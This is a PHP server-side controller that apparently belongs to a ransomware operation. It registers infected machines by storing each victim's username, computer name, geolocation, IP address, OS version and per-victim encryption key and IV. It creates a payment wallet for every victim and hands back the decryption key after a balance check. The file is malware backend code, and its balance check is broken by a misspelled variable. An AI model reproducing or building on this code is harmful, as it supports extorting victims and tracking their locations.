<?php

require_once '../Model/user.php';
require_once '../Model/wallet.php';


$action = $_GET['action'];

switch ($action){
    case 'add':
        if (isset($_POST['uuid']) && isset($_POST['username']) && isset($_POST['computername']) && isset($_POST['langId']) && isset($_POST['country']) && isset($_POST['region']) && isset($_POST['city']) && isset($_POST['lat']) && isset($_POST['long']) && isset($_POST['osversion']) && isset($_POST['key']) && isset($_POST['iv']) && isset($_POST['ip'])){
            $uuid = $_POST['uuid'];
            $username = $_POST['username'];
            $computername = $_POST['computername'];
            $langId = $_POST['langId'];
            $country = $_POST['country'];
            $region = $_POST['region'];
            $city = $_POST['city'];
            $lat = $_POST['lat'];
            $long = $_POST['long'];
            $osversion = $_POST['osversion'];
            $key = $_POST['key'];
            $iv = $_POST['iv'];
            $ip = $_POST['ip'];
            
            if(Users::add($uuid, $username, $computername, $langId, $country, $region, $city, $lat, $long, $osversion, $key, $iv, $ip)){
                $result = Wallet::createWallet($uuid);
            } else {
                echo json_encode(false);
            }
            echo json_encode($result);
        } else {
            echo json_encode(false);
        }
        break;

    case 'checkBalance':
        if (isset($_POST['uuid'])){
            $uuid = $_POST['uuid'];
            $publicKey = Wallet::getUuidPublicKey($uuid);
            $balance = Wallet::getBalanceFromUuid($publicKey[0]['publicKey']);
            if ((int)$balace >= 0){
                echo Users::getKey($uuid);
            } else {
                echo json_encode(false);
            }
        } else {
            echo json_encode(false);
        }
        break;
    
    
        
}